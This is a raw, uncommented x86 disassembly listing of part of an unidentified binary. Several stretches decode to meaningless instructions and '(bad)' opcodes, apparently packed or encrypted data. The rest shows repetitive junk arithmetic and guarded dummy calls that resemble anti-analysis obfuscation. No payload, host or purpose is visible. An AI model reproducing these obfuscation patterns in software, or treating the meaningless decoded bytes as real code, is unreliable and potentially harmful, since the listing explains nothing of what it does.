  41ef18:	icebp  
  41ef19:	mov    bl,0x1c
  41ef1b:	mov    cl,0x99
  41ef1d:	and    BYTE PTR ds:0x11c4bfb1,ah
  41ef23:	shl    BYTE PTR [esi+0x43],cl
  41ef26:	test   al,0xbc
  41ef28:	imul   ecx,esi,0x6e4665eb
  41ef2e:	jp     0x41ef9a
  41ef30:	or     al,dh
  41ef32:	dec    eax
  41ef33:	sti    
  41ef34:	in     eax,0xdc
  41ef36:	jmp    0xce4c:0xc87a2685
  41ef3d:	scas   al,BYTE PTR es:[edi]
  41ef3e:	push   cs
  41ef3f:	inc    ecx
  41ef40:	mov    ebx,0x948151c7
  41ef45:	addr16 sar ebp,1
  41ef48:	pop    edx
  41ef49:	xchg   ecx,eax
  41ef4a:	cs xchg ecx,eax
  41ef4c:	imul   esp,esp,0xffffff8b
  41ef4f:	inc    ebp
  41ef50:	mov    ah,0x81
  41ef52:	adc    eax,0x42815f
  41ef57:	xchg   ebx,eax
  41ef58:	xor    al,0x0
  41ef5a:	add    BYTE PTR [ebx],al
  41ef5c:	test   DWORD PTR [edi+edi*8-0x1],ecx
  41ef60:	inc    DWORD PTR [ecx+0x29cf2]
  41ef66:	add    BYTE PTR ds:0x2e02,dh
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x428283
  41ef7a:	sbb    DWORD PTR ds:0x42815f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428177,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x4282eb,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282db,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x4282eb,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428e0c
  41efd7:	sub    edx,DWORD PTR ds:0x42821f
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42823b
  41efe4:	mov    DWORD PTR ds:0x428383,0x703b
  41efee:	and    edx,DWORD PTR ds:0x42822b
  41eff4:	xor    edx,DWORD PTR ds:0x428297
  41effa:	and    DWORD PTR ds:0x428397,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0xc539a3b0
  41f021:	jl     0x41efbc
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx-0x68e7e7ee],ah
  41f02b:	pop    ebp
  41f02c:	mov    edx,0xab4ac5e0
  41f031:	push   cs
  41f032:	mov    bh,0x53
  41f034:	pop    ebp
  41f035:	sub    DWORD PTR [esi+0x40],edi
  41f038:	outs   dx,DWORD PTR fs:[esi]
  41f03a:	sbb    DWORD PTR [ebx+0x168d9cff],0xffffff87
  41f041:	adc    eax,0x6db636f7
  41f046:	in     al,0x61
  41f048:	xchg   eax,ebx
  41f04a:	mov    al,ds:0x3c7c61ca
  41f04f:	push   esi
  41f050:	jno    0x41f0a0
  41f052:	cmp    eax,0x3ee2e676
  41f057:	jle    0x41f015
  41f059:	mov    bh,0x98
  41f05b:	call   0x42dc7c87
  41f060:	add    dl,cl
  41f062:	cli    
  41f063:	repnz rcr BYTE PTR [ecx+ebp*4-0x23ebfc75],1
  41f06b:	call   0x1171:0xc8203af9
  41f072:	fwait
  41f073:	pop    ds
  41f074:	mov    edi,0x1549d1da
  41f079:	push   esi
  41f07a:	mov    DWORD PTR [edx],esi
  41f07c:	lods   eax,DWORD PTR ds:[esi]
  41f07d:	jo     0x41f08d
  41f07f:	(bad)  
  41f080:	jecxz  0x41f060
  41f082:	scas   al,BYTE PTR es:[edi]
  41f083:	xor    eax,0x392781a6
  41f088:	xor    DWORD PTR [eax+0xbee29b0],esi
  41f08e:	sbb    esp,ecx
  41f090:	push   ebp
  41f091:	test   DWORD PTR gs:[eax-0x7b],edx
  41f095:	add    BYTE PTR [ecx-0x65],cl
  41f098:	cs ins DWORD PTR es:[edi],dx
  41f09a:	(bad)  
  41f09b:	sbb    al,0x1
  41f09d:	push   edi
  41f09e:	rol    DWORD PTR [eax+ebx*2+0x551b3e13],cl
  41f0a5:	cmp    BYTE PTR [edi],bl
  41f0a7:	mov    ds:0x31728b1e,al
  41f0ac:	mov    bh,0x10
  41f0ae:	outs   dx,DWORD PTR ds:[esi]
  41f0af:	mov    BYTE PTR es:[edi-0x66e67790],al
  41f0b6:	xchg   BYTE PTR [ebx-0x16],ah
  41f0b9:	pop    edx
  41f0ba:	inc    ebx
  41f0bb:	clc    
  41f0bc:	repz jecxz 0x41f107
  41f0bf:	out    dx,eax
  41f0c0:	mov    dl,0x44
  41f0c2:	ss inc ebx
  41f0c4:	sub    DWORD PTR ds:0xcd650dd8,ecx
  41f0ca:	jg     0x41f0a3
  41f0cc:	mov    ds:0xcdc91aeb,eax
  41f0d1:	pop    esp
  41f0d2:	mov    cl,0x5a
  41f0d4:	je     0x41f0ce
  41f0d6:	inc    esi
  41f0d7:	dec    esp
  41f0d8:	push   eax
  41f0d9:	xchg   ebx,eax
  41f0da:	aaa    
  41f0db:	fisttp WORD PTR [esi-0x5b]
  41f0de:	(bad)  
  41f0df:	cld    
  41f0e0:	sbb    dh,BYTE PTR [eax]
  41f0e2:	mov    ebx,0x96d2178f
  41f0e7:	call   0xed3b4854
  41f0ec:	loop   0x41f131
  41f0ee:	outs   dx,BYTE PTR ds:[esi]
  41f0ef:	in     al,0xe7
  41f0f1:	jmp    0x3822:0x2dc89223
  41f0f8:	pop    edi
  41f0f9:	adc    cl,ah
  41f0fb:	mov    BYTE PTR [eax-0x18],dh
  41f0fe:	add    edi,esp
  41f100:	jge    0x41f0d3
  41f102:	stc    
  41f103:	jb     0x41f0c9
  41f105:	push   0xffffffbf
  41f107:	enter  0x1f91,0x94
  41f10b:	test   DWORD PTR [edi+ebp*8-0x55a95684],eax
  41f112:	dec    esp
  41f113:	jnp    0x41f17c
  41f115:	sar    DWORD PTR [edi+esi*8],0x3f
  41f119:	inc    esp
  41f11a:	or     BYTE PTR [ecx+edx*4],ch
  41f11d:	ss ret 
  41f11f:	lods   al,BYTE PTR ds:[esi]
  41f120:	dec    ecx
  41f121:	sbb    eax,0x5b1e9bf3
  41f126:	pop    ds
  41f127:	sbb    edx,DWORD PTR [ecx-0x38]
  41f12a:	pusha  
  41f12b:	(bad)  
  41f12c:	loopne 0x41f116
  41f12e:	sbb    al,0xad
  41f130:	fs mov cl,0xab
  41f133:	imul   edi,DWORD PTR [esi-0x6c0bad33],0x53
  41f13a:	(bad)  
  41f13b:	hlt    
  41f13c:	push   edx
  41f13d:	jp     0x41f1ba
  41f13f:	dec    ebx
  41f140:	aam    0x4
  41f142:	sbb    edx,DWORD PTR [ebx]
  41f144:	dec    edx
  41f145:	adc    eax,0x8a87765
  41f14a:	cwde   
  41f14b:	push   ds
  41f14c:	push   eax
  41f14d:	adc    eax,0xed655c0c
  41f152:	cld    
  41f153:	jns    0x41f198
  41f155:	adc    bl,0x9d
  41f158:	mov    esp,0x52227318
  41f15d:	dec    ebx
  41f15e:	push   ss
  41f15f:	sub    DWORD PTR [ebx],ebx
  41f161:	data16 setne BYTE PTR ds:0x3aedcf15
  41f169:	ins    DWORD PTR es:[di],dx
  41f16b:	aas    
  41f16c:	shr    edx,0x8f
  41f16f:	mov    ebx,DWORD PTR [ebx-0x44]
  41f172:	les    edi,FWORD PTR ds:0x68f47dd9
  41f178:	and    al,dh
  41f17a:	sbb    al,0x47
  41f17c:	(bad)
  41f180:	add    DWORD PTR [ebp+0x34b6fa6d],eax
  41f186:	test   DWORD PTR [ebp+edi*8-0x3cd4ae03],eax
  41f18d:	icebp  
  41f18e:	loope  0x41f1ad
  41f190:	cmp    DWORD PTR [esp+edx*4],edi
  41f193:	(bad)  [edi-0x3926ad7]
  41f199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f19a:	push   ebx
  41f19b:	xchg   ecx,eax
  41f19c:	(bad)
  41f19f:	out    dx,eax
  41f1a0:	cdq    
  41f1a1:	call   0xe8f4a4b6
  41f1a6:	pop    edx
  41f1a7:	fbstp  TBYTE PTR [edi-0x372e73ad]
  41f1ad:	mov    cl,0xba
  41f1af:	rcr    DWORD PTR [ebx],cl
  41f1b1:	dec    ebp
  41f1b2:	lock mov bl,0x93
  41f1b5:	or     BYTE PTR [edx+0xf24a78],0xf7
  41f1bc:	xor    al,0xbc
  41f1be:	mov    BYTE PTR [edi+edi*2+0x6c543eed],dl
  41f1c5:	mov    eax,0x27a11399
  41f1ca:	pop    esp
  41f1cb:	cmp    ebx,DWORD PTR [eax+0x4d]
  41f1ce:	bound  edi,QWORD PTR [ecx]
  41f1d0:	pop    esi
  41f1d1:	ins    BYTE PTR es:[edi],dx
  41f1d2:	lods   eax,DWORD PTR ds:[esi]
  41f1d3:	mov    esi,0x8d5562c3
  41f1d8:	sub    bl,BYTE PTR [esi+0x7c]
  41f1db:	ja     0x41f1d9
  41f1dd:	dec    eax
  41f1de:	(bad)  
  41f1df:	sti    
  41f1e0:	fs xchg esp,eax
  41f1e2:	das    
  41f1e3:	sbb    edx,DWORD PTR [edi+ebx*2+0x2]
  41f1e7:	fisub  DWORD PTR [ecx-0x37]
  41f1ea:	ret    
  41f1eb:	je     0x41f1eb
  41f1ed:	xchg   ebp,eax
  41f1ee:	xlat   BYTE PTR ds:[ebx]
  41f1ef:	int    0x16
  41f1f1:	sub    BYTE PTR [ecx-0x67e1cca2],0x9a
  41f1f8:	push   eax
  41f1f9:	dec    edx
  41f1fa:	daa    
  41f1fb:	dec    edi
  41f1fc:	inc    ebp
  41f1fd:	je     0x41f204
  41f1ff:	addr16 jnp 0x41f26b
  41f202:	imul   eax,DWORD PTR [edx-0x519411c1],0x5
  41f209:	fldenv [edi-0x53ae708e]
  41f20f:	bound  ebp,QWORD PTR [eax]
  41f211:	aam    0xf7
  41f213:	jmp    0xcdebb2aa
  41f218:	push   ds
  41f219:	and    eax,0x1b437818
  41f21e:	add    BYTE PTR [ebp+0x62],bl
  41f221:	call   0xb013:0x793b6c95
  41f228:	ja     0x41f276
  41f22a:	sbb    al,0x7d
  41f22c:	push   ebp
  41f22d:	jns    0x41f228
  41f22f:	inc    ebx
  41f230:	imul   esp,DWORD PTR [esi],0xffffffcd
  41f233:	cmp    al,0x1f
  41f235:	pop    ecx
  41f236:	mov    ah,0x41
  41f238:	xchg   ecx,eax
  41f239:	aas    
  41f23a:	inc    esi
  41f23b:	retf   0x3e7a
  41f23e:	and    edx,DWORD PTR [ebx]
  41f240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f241:	jne    0x41f243
  41f243:	scas   eax,DWORD PTR es:[edi]
  41f244:	mov    eax,ds:0xdafea60
  41f249:	mov    ds:0xa9fbd0fd,eax
  41f24e:	xor    al,0x69
  41f250:	xchg   edx,eax
  41f251:	xchg   DWORD PTR [ebx-0x6b68650c],esi
  41f257:	or     bh,al
  41f259:	stc    
  41f25a:	out    0xb7,al
  41f25c:	dec    esi
  41f25d:	test   BYTE PTR [edi+0x4c42e086],0x72
  41f264:	fcom   DWORD PTR [eax-0x29]
  41f267:	into   
  41f268:	adc    ch,cl
  41f26a:	vaddsd xmm7,xmm7,QWORD PTR ds:0x37241569
  41f272:	add    esp,DWORD PTR [eax]
  41f274:	int3   
  41f275:	neg    BYTE PTR [edi+0x66]
  41f278:	test   BYTE PTR [ecx-0x1ab40b51],bh
  41f27e:	jl     0x41f2c2
  41f280:	xchg   dl,bh
  41f282:	pop    eax
  41f283:	sub    dl,BYTE PTR [ecx]
  41f285:	dec    edx
  41f286:	test   dh,cl
  41f288:	test   BYTE PTR [edx+ebp*1+0x4e8adc37],ch
  41f28f:	sahf   
  41f290:	push   esi
  41f291:	popf   
  41f292:	mov    DWORD PTR ds:0xc5d17979,0x1eacbc77
  41f29c:	rcr    DWORD PTR [esi+0x33bb72f1],0x26
  41f2a3:	cmp    eax,0x421bba64
  41f2a8:	and    ch,BYTE PTR [ebx-0x7e]
  41f2ab:	jecxz  0x41f31b
  41f2ad:	leave  
  41f2ae:	adc    ch,BYTE PTR [eax]
  41f2b0:	mov    ch,0x5c
  41f2b2:	mov    esp,0x1fefa439
  41f2b7:	ds sbb eax,0xc9d3e13b
  41f2bd:	push   esp
  41f2be:	jle    0x41f2fa
  41f2c0:	sbb    eax,0xafdc9b46
  41f2c5:	and    al,0xbb
  41f2c7:	popa   
  41f2c8:	mov    WORD PTR [ecx],es
  41f2ca:	xchg   esi,eax
  41f2cb:	ins    DWORD PTR es:[edi],dx
  41f2cc:	cmp    BYTE PTR [ecx-0x17],bl
  41f2cf:	nop
  41f2d0:	mov    ebp,0x2fac6a53
  41f2d5:	sbb    BYTE PTR [edx+0x4e],bh
  41f2d8:	in     al,0x25
  41f2da:	jmp    0xb7ba:0x73b157d
  41f2e1:	or     DWORD PTR [eax-0x30],edx
  41f2e4:	cs pop ds
  41f2e6:	data16 (bad) 
  41f2e8:	dec    ebp
  41f2e9:	mov    BYTE PTR [ebx],dh
  41f2eb:	mov    al,ds:0xf75f4aeb
  41f2f0:	and    eax,0x710090b2
  41f2f5:	sub    al,ah
  41f2f7:	dec    edx
  41f2f8:	dec    edx
  41f2f9:	xchg   ecx,eax
  41f2fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2fb:	add    eax,0xff1dc292
  41f300:	mov    ebp,0xacdb7cd7
  41f305:	retf   
  41f306:	fsub   DWORD PTR ds:0xdbcb96e1
  41f30c:	jecxz  0x41f290
  41f30e:	pop    esp
  41f30f:	sub    eax,0x3b156ed1
  41f314:	into   
  41f315:	cmp    eax,0xa513803f
  41f31a:	sub    eax,DWORD PTR [ebp-0x550fc5e9]
  41f320:	dec    edi
  41f321:	sti    
  41f322:	ins    DWORD PTR es:[edi],dx
  41f323:	mov    bl,0xcd
  41f325:	leave  
  41f326:	push   0x1755eb6a
  41f32b:	in     eax,0x9d
  41f32d:	cs (bad) 
  41f32f:	ss aaa 
  41f331:	jge    0x41f2c3
  41f333:	or     DWORD PTR [ebx-0x76dcdd33],esi
  41f339:	pop    ds
  41f33a:	or     BYTE PTR [eax-0x46],dh
  41f33d:	add    ebp,DWORD PTR [edi+ecx*1]
  41f340:	xchg   esi,eax
  41f341:	inc    esp
  41f342:	adc    eax,0xe2714901
  41f347:	and    al,0x55
  41f349:	push   ecx
  41f34a:	add    eax,0x9a634409
  41f34f:	xchg   esp,eax
  41f350:	xlat   BYTE PTR ds:[ebx]
  41f351:	and    bh,cl
  41f353:	sbb    al,0xf1
  41f355:	sub    BYTE PTR [esi+esi*1+0x78977a78],bh
  41f35c:	sti    
  41f35d:	mov    eax,0xba24ec99
  41f362:	(bad)  
  41f363:	fwait
  41f364:	clc    
  41f365:	mov    ds:0xc77ebf55,al
  41f36a:	inc    ebp
  41f36b:	nop
  41f36c:	mov    DWORD PTR [edi+0x0],ebp
  41f36f:	add    BYTE PTR [ebx+0x4283033d],al
  41f375:	add    BYTE PTR [eax],al
  41f377:	movzx  edx,WORD PTR ds:0x42821f
  41f37e:	mov    ecx,DWORD PTR ds:0x428267
  41f384:	mov    ecx,DWORD PTR ds:0x428253
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42823f,ebx
  41f397:	cmp    DWORD PTR ds:0x428303,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x428113
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428e10
  41f3c7:	sub    ecx,DWORD PTR ds:0x428237
  41f3cd:	mov    DWORD PTR ds:0x428187,0x2f55
  41f3d7:	and    DWORD PTR ds:0x4282e3,ebx
  41f3dd:	or     DWORD PTR ds:0x4282fb,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x42818f
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x428317,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42816f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42837b,0x0
  41f428:	mov    DWORD PTR ds:0x42830f,0xae0
  41f432:	mov    DWORD PTR ds:0x42814b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42836b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x4282f3,ebx
  41f449:	mov    DWORD PTR ds:0x42816f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42837b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427f25
  41f468:	call   DWORD PTR ds:0x428e94
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x428387
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x428187,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282df,0x6486
  41f49d:	mov    DWORD PTR ds:0x42824b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42827b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x428383,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x428187,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x427feb
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428e14
  41f4d7:	neg    DWORD PTR ds:0x42817b
  41f4dd:	and    DWORD PTR ds:0x42825f,0x4282e3
  41f4e7:	and    DWORD PTR ds:0x42835f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428177
  41f4f4:	sbb    edx,DWORD PTR ds:0x4282ff
  41f4fa:	mov    DWORD PTR ds:0x428177,edx
  41f500:	sub    DWORD PTR ds:0x428273,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42817f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x428383,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428163,0x0
  41f53b:	mov    DWORD PTR ds:0x42837f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42823f,0x6044
  41f55b:	not    DWORD PTR ds:0x42824b
  41f561:	cmp    DWORD PTR ds:0x428163,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428e18
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428143,edi
  41f5a3:	and    DWORD PTR ds:0x4282db,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x4282f3
  41f5b0:	add    edx,DWORD PTR ds:0x4282eb
  41f5b6:	mov    DWORD PTR ds:0x4282f3,edx
  41f5bc:	add    DWORD PTR ds:0x4282e7,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42824b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42837f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x42818b,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x42830f,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x4282ff,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x428383,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428247,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42825b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428277,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428243
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x42828f,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42825b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428e1c
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x42821b,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x4282e7
  41f67a:	add    DWORD PTR ds:0x42830b,ecx
  41f680:	sbb    DWORD PTR ds:0x42827f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428153
  41f68c:	adc    DWORD PTR ds:0x428147,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x4283af
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42823f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x428313,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x4282f7,0x0
  41f6e5:	mov    DWORD PTR ds:0x4282ff,0x6375
  41f6ef:	not    DWORD PTR ds:0x42815f
  41f6f5:	mov    DWORD PTR ds:0x42821b,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x42822b,0x2351
  41f70a:	mov    DWORD PTR ds:0x42826f,ebx
  41f710:	cmp    DWORD PTR ds:0x4282f7,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42825b
  41f727:	call   DWORD PTR ds:0x428e20
  41f72d:	movzx  ecx,WORD PTR ds:0x42822b
  41f734:	xor    DWORD PTR ds:0x428397,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42825b
  41f740:	add    ecx,DWORD PTR ds:0x428253
  41f746:	mov    DWORD PTR ds:0x42825b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42826b
  41f752:	adc    DWORD PTR ds:0x42837b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x428317,ebx
  41f75f:	sub    DWORD PTR ds:0x428177,edx
  41f765:	and    DWORD PTR ds:0x4282f7,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x42830b,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428377,0x4282eb
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x428227,0x3807
  41f796:	add    eax,0x161e
  41f79b:	or     ecx,DWORD PTR ds:0x428237
  41f7a1:	mov    ecx,DWORD PTR [ebp-0x11c]
  41f7a7:	add    DWORD PTR ds:0x42822b,0x428187
  41f7b1:	or     eax,ecx
  41f7b3:	add    DWORD PTR ds:0x428377,edi
  41f7b9:	add    eax,0x1cca
  41f7be:	or     ecx,DWORD PTR ds:0x428277
  41f7c4:	xor    eax,0x96c9
  41f7c9:	mov    DWORD PTR [ebp-0x38],eax
  41f7cc:	cmp    DWORD PTR ds:0x428383,0x0
  41f7d3:	mov    ecx,DWORD PTR ds:0x428367
  41f7d9:	mov    DWORD PTR ds:0x42835b,ecx
  41f7df:	mov    DWORD PTR ds:0x4282ff,0x7d57
  41f7e9:	jmp    0x41f8c3
  41f7ee:	mov    DWORD PTR ds:0x42827f,0xe1
  41f7f8:	mov    DWORD PTR ds:0x428177,edi
  41f7fe:	cmp    DWORD PTR ds:0x428383,0x0
  41f805:	jne    0x41f836
  41f80b:	push   DWORD PTR [ebp-0xc]
  41f80e:	push   0x427f6a
  41f813:	push   0x427ed1
  41f818:	call   DWORD PTR ds:0x428e98
  41f81e:	sub    ecx,ecx
  41f820:	xor    ecx,ecx
  41f822:	add    ecx,DWORD PTR ds:0x4283ab
  41f828:	mov    ecx,DWORD PTR [ecx]
  41f82a:	add    DWORD PTR ds:0x428267,ecx
  41f830:	adc    DWORD PTR ds:0x42814f,edi
  41f836:	and    DWORD PTR ds:0x42838f,0x3101
  41f840:	mov    DWORD PTR ds:0x428397,0x28b7
  41f84a:	cmp    DWORD PTR ds:0x42815f,0x0
  41f851:	mov    ecx,DWORD PTR ds:0x42824f
  41f857:	mov    DWORD PTR ds:0x42823b,0x4504
  41f861:	mov    DWORD PTR ds:0x42836f,0x3c46
  41f86b:	mov    ecx,DWORD PTR ds:0x428393
  41f871:	jmp    0x41f8c3
  41f876:	mov    DWORD PTR ds:0x4282ff,ebx
  41f87c:	cmp    DWORD PTR ds:0x42815f,0x0
  41f883:	jge    0x41f8b3
  41f889:	push   0x1
  41f88b:	push   0x427f9c
  41f890:	push   0x427fa6
  41f895:	call   DWORD PTR ds:0x428e9c
  41f89b:	and    DWORD PTR ds:0x428177,ebx
  41f8a1:	add    ecx,ecx
  41f8a3:	adc    DWORD PTR ds:0x4282ff,0x1bb
  41f8ad:	and    ecx,DWORD PTR ds:0x428393
  41f8b3:	sub    ecx,0x5232
  41f8b9:	sub    DWORD PTR ds:0x428167,0x6c90
  41f8c3:	mov    DWORD PTR [ebp-0x118],0x6083
  41f8cd:	or     DWORD PTR ds:0x428257,ebx
  41f8d3:	mov    DWORD PTR [ebp-0x88],0x556
  41f8dd:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41f8e7:	mov    eax,DWORD PTR [ebp-0x140]
  41f8ed:	add    eax,0x5af8
  41f8f2:	xor    DWORD PTR ds:0x42836b,0x37e5
  41f8fc:	mov    ecx,DWORD PTR [ebp-0x88]
  41f902:	sub    DWORD PTR ds:0x428153,0x42838f
  41f90c:	sub    eax,ecx
  41f90e:	dec    DWORD PTR ds:0x428267
  41f914:	mov    ecx,DWORD PTR [ebp-0x118]
  41f91a:	lea    eax,[eax+ecx*1+0x68dc]
  41f921:	or     eax,0x52f6
  41f926:	adc    ecx,DWORD PTR ds:0x42821f
  41f92c:	sub    eax,0x1dbfe
  41f931:	mov    DWORD PTR [ebp-0xac],eax
  41f937:	cmp    DWORD PTR ds:0x4282e3,0x0
  41f93e:	mov    DWORD PTR ds:0x4282f3,0x63c0
  41f948:	mov    DWORD PTR ds:0x428183,0x2316
  41f952:	mov    ecx,0x40fd
  41f957:	jmp    0x41f99f
  41f95c:	mov    eax,ds:0x42828f
  41f961:	mov    eax,0x5fd6
  41f966:	cmp    DWORD PTR ds:0x4282e3,0x0
  41f96d:	je     0x41f98d
  41f973:	call   DWORD PTR ds:0x428ea0
  41f979:	sbb    DWORD PTR ds:0x428393,0x209
  41f983:	xor    DWORD PTR ds:0x428383,0x72db
  41f98d:	add    ecx,ecx
  41f98f:	and    DWORD PTR ds:0x42827f,0x6064
  41f999:	or     ecx,0x4aaa
  41f99f:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41f9a6:	mov    DWORD PTR [ebp-0x100],0x49f7
  41f9b0:	xor    ecx,eax
  41f9b2:	mov    eax,DWORD PTR [ebp-0x100]
  41f9b8:	movzx  ecx,WORD PTR ds:0x428183
  41f9bf:	or     DWORD PTR ds:0x42836f,ecx
  41f9c5:	add    eax,0x7b60
  41f9ca:	cmp    DWORD PTR ds:0x4282e7,0x0
  41f9d1:	mov    DWORD PTR ds:0x42822b,0x756d
  41f9db:	mov    DWORD PTR ds:0x4282e3,0x1d60
  41f9e5:	jmp    0x41fa41
  41f9ea:	mov    ecx,DWORD PTR ds:0x4282eb
  41f9f0:	cmp    DWORD PTR ds:0x4282e7,0x0
  41f9f7:	jg     0x41fa21
  41f9fd:	push   0x59e0
  41fa02:	call   DWORD PTR ds:0x428e24
  41fa08:	adc    DWORD PTR ds:0x42837f,ebx
  41fa0e:	sbb    DWORD PTR ds:0x428303,ebx
  41fa14:	movzx  ecx,WORD PTR ds:0x42835b
  41fa1b:	add    DWORD PTR ds:0x42836b,ecx
  41fa21:	add    DWORD PTR ds:0x428363,0x77eb
